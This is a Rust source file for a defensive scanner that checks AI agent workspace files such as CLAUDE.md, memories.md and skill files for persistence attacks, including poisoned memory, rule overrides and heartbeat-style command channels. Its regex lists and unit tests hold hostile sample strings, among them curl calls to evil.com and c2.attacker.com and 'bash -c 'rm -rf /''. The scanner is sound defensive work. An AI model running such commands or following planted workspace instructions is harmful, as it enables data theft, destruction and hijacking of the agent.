//! Workspace Guard Engine
//! 
//! Detects workspace persistence attacks:
//! - HEARTBEAT.md C2 channels
//! - memories.md poisoning
//! - *.skill.md code execution
//! - CLAUDE.md/RULES.md behavior override

use once_cell::sync::Lazy;
use regex::RegexSet;

use super::MatchResult;
use super::traits::{PatternMatcher, EngineCategory};

/// Threat types detected by WorkspaceGuard
#[derive(Debug, Clone, PartialEq)]
pub enum ThreatType {
    C2Trigger,     // Scheduled/polling patterns
    Callback,      // Exfiltration URLs
    RCE,           // Code execution
    Combined,      // Multiple threat types
}

/// A detected workspace threat
#[derive(Debug, Clone)]
pub struct WorkspaceThreat {
    pub threat_type: ThreatType,
    pub confidence: f64,
    pub pattern_count: usize,
}

impl WorkspaceThreat {
    pub fn risk_score(&self) -> f64 {
        match self.threat_type {
            ThreatType::RCE => 0.95,
            ThreatType::Callback => 0.85,
            ThreatType::C2Trigger => 0.80,
            ThreatType::Combined => 0.98,
        }
    }
}

/// Sensitive workspace files that require enhanced scrutiny
const SENSITIVE_FILES: &[&str] = &[
    "HEARTBEAT.md",
    "HEARTBEAT.txt",
    "memories.md",
    "CLAUDE.md",
    "RULES.md",
    "persona.md",
    ".clinerules",
    ".cursorrules",
    "GEMINI.md",
];

/// Skill file patterns
const SKILL_EXTENSIONS: &[&str] = &[
    ".skill.md",
    ".skill.txt",
];

/// C2 trigger patterns - scheduled/polling commands
static C2_PATTERNS: Lazy<RegexSet> = Lazy::new(|| {
    RegexSet::new([
        r"(?i)every\s+\d+\s*(min|minute|hour|sec|second)",
        r"(?i)whenever\s+(greeted|user|triggered|invoked)",
        r"(?i)when\s+(greeted|user|triggered)",
        r"(?i)on\s+(startup|load|init|start)",
        r"(?i)periodically\s+(check|run|execute|poll)",
        r"(?i)at\s+the\s+(start|beginning)\s+of\s+(each|every)",
        r"(?i)always\s+(first|before|check)",
    ]).expect("Failed to build C2 patterns")
});

/// Callback/exfiltration patterns
static CALLBACK_PATTERNS: Lazy<RegexSet> = Lazy::new(|| {
    RegexSet::new([
        r"(?i)curl\s+",
        r"(?i)wget\s+",
        r"(?i)fetch\s*\(",
        r"https?://",
        r"(?i)discord\.com/api/webhooks",
        r"(?i)hooks\.slack\.com",
        r"(?i)api\.telegram\.org",
        r"(?i)webhook",
        r"(?i)ngrok\.io",
        r"(?i)burpcollaborator",
    ]).expect("Failed to build callback patterns")
});

/// RCE patterns - code execution commands
static RCE_PATTERNS: Lazy<RegexSet> = Lazy::new(|| {
    RegexSet::new([
        r"(?i)bash\s+-c",
        r"(?i)exec\s*\(",
        r"(?i)system\s*\(",
        r"(?i)eval\s*\(",
        r"(?i)subprocess\.",
        r"(?i)os\.(system|popen)",
        r"(?i)child_process",
        r"(?i)shell_exec",
        r"(?i)run_command",
        r"(?i)spawn\s*\(",
    ]).expect("Failed to build RCE patterns")
});

/// Workspace Guard engine
pub struct WorkspaceGuard {
    _initialized: bool,
}

impl WorkspaceGuard {
    pub fn new() -> Self {
        // Force lazy initialization
        let _ = C2_PATTERNS.len();
        let _ = CALLBACK_PATTERNS.len();
        let _ = RCE_PATTERNS.len();
        
        Self { _initialized: true }
    }
    
    /// Check if filename is a sensitive workspace file
    pub fn is_sensitive_file(&self, filename: &str) -> bool {
        // Check exact matches
        for sensitive in SENSITIVE_FILES {
            if filename.ends_with(sensitive) || filename == *sensitive {
                return true;
            }
        }
        
        // Check skill extensions
        for ext in SKILL_EXTENSIONS {
            if filename.ends_with(ext) {
                return true;
            }
        }
        
        false
    }
    
    /// Detect C2 trigger patterns
    pub fn detect_c2(&self, content: &str) -> usize {
        C2_PATTERNS.matches(content).iter().count()
    }
    
    /// Detect callback/exfiltration patterns
    pub fn detect_callback(&self, content: &str) -> usize {
        CALLBACK_PATTERNS.matches(content).iter().count()
    }
    
    /// Detect RCE patterns
    pub fn detect_rce(&self, content: &str) -> usize {
        RCE_PATTERNS.matches(content).iter().count()
    }
    
    /// Scan content for all threat types
    pub fn scan_content(&self, content: &str) -> Option<WorkspaceThreat> {
        let c2_count = self.detect_c2(content);
        let callback_count = self.detect_callback(content);
        let rce_count = self.detect_rce(content);
        
        let total = c2_count + callback_count + rce_count;
        
        if total == 0 {
            return None;
        }
        
        // Determine primary threat type
        let threat_type = if c2_count > 0 && callback_count > 0 || 
                          c2_count > 0 && rce_count > 0 ||
                          callback_count > 0 && rce_count > 0 {
            ThreatType::Combined
        } else if rce_count > 0 {
            ThreatType::RCE
        } else if callback_count > 0 {
            ThreatType::Callback
        } else {
            ThreatType::C2Trigger
        };
        
        let threat = WorkspaceThreat {
            threat_type,
            confidence: (total as f64 * 0.25).min(1.0),
            pattern_count: total,
        };
        
        Some(threat)
    }
}

impl Default for WorkspaceGuard {
    fn default() -> Self {
        Self::new()
    }
}

impl PatternMatcher for WorkspaceGuard {
    fn name(&self) -> &'static str {
        "workspace_guard"
    }
    
    fn scan(&self, text: &str) -> Vec<MatchResult> {
        if let Some(threat) = self.scan_content(text) {
            vec![MatchResult {
                engine: self.name().to_string(),
                pattern: format!("{:?}", threat.threat_type),
                confidence: threat.risk_score(),
                start: 0,
                end: text.len().min(100),
            }]
        } else {
            vec![]
        }
    }
    
    fn category(&self) -> EngineCategory {
        EngineCategory::Security
    }
}

// ============================================================================
// TDD Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_c2_trigger_detection() {
        let guard = WorkspaceGuard::new();
        
        // Should detect
        assert!(guard.detect_c2("every 5 minutes check heartbeat") > 0);
        assert!(guard.detect_c2("whenever user is greeted") > 0);
        assert!(guard.detect_c2("on startup, execute this") > 0);
        assert!(guard.detect_c2("periodically poll the server") > 0);
        
        // Should NOT detect
        assert_eq!(guard.detect_c2("normal readme content"), 0);
        assert_eq!(guard.detect_c2("# Project Documentation"), 0);
    }
    
    #[test]
    fn test_callback_detection() {
        let guard = WorkspaceGuard::new();
        
        // Should detect
        assert!(guard.detect_callback("curl https://evil.com") > 0);
        assert!(guard.detect_callback("fetch('https://attacker.com')") > 0);
        assert!(guard.detect_callback("discord.com/api/webhooks/123") > 0);
        assert!(guard.detect_callback("send to hooks.slack.com") > 0);
        
        // Should NOT detect (no URL context)
        assert_eq!(guard.detect_callback("just some text"), 0);
    }
    
    #[test]
    fn test_rce_detection() {
        let guard = WorkspaceGuard::new();
        
        // Should detect
        assert!(guard.detect_rce("bash -c 'rm -rf /'") > 0);
        assert!(guard.detect_rce("exec('malicious code')") > 0);
        assert!(guard.detect_rce("subprocess.run(['cmd'])") > 0);
        assert!(guard.detect_rce("os.system('whoami')") > 0);
        
        // Should NOT detect
        assert_eq!(guard.detect_rce("safe readme content"), 0);
    }
    
    #[test]
    fn test_benign_pass() {
        let guard = WorkspaceGuard::new();
        
        let benign = r#"
# Project README

This is a normal project with documentation.

## Installation
1. Clone the repo
2. Run npm install
3. Configure settings

## License
MIT
"#;
        
        let result = guard.scan_content(benign);
        assert!(result.is_none(), "Benign content should not trigger");
    }
    
    #[test]
    fn test_sensitive_file_detection() {
        let guard = WorkspaceGuard::new();
        
        // Should be sensitive
        assert!(guard.is_sensitive_file("HEARTBEAT.md"));
        assert!(guard.is_sensitive_file("memories.md"));
        assert!(guard.is_sensitive_file("CLAUDE.md"));
        assert!(guard.is_sensitive_file("RULES.md"));
        assert!(guard.is_sensitive_file("custom.skill.md"));
        assert!(guard.is_sensitive_file(".clinerules"));
        
        // Should NOT be sensitive
        assert!(!guard.is_sensitive_file("README.md"));
        assert!(!guard.is_sensitive_file("package.json"));
        assert!(!guard.is_sensitive_file("main.rs"));
    }
    
    #[test]
    fn test_combined_threat() {
        let guard = WorkspaceGuard::new();
        
        // C2 + Callback = Combined threat
        let malicious = "every 5 minutes curl https://c2.attacker.com/beacon";
        let result = guard.scan_content(malicious);
        
        assert!(result.is_some());
        let threat = result.unwrap();
        assert_eq!(threat.threat_type, ThreatType::Combined);
        assert!(threat.risk_score() >= 0.95);
    }
    
    #[test]
    fn test_pattern_matcher_trait() {
        let guard = WorkspaceGuard::new();
        
        // Name
        assert_eq!(guard.name(), "workspace_guard");
        
        // Category
        assert_eq!(guard.category(), EngineCategory::Security);
        
        // Scan malicious - returns Vec<MatchResult>
        let result = guard.scan("every 5 min exec('rm -rf')");
        assert!(!result.is_empty(), "Should detect combined threat");
        assert!(result[0].confidence >= 0.9);
        assert_eq!(result[0].engine, "workspace_guard");
    }
}
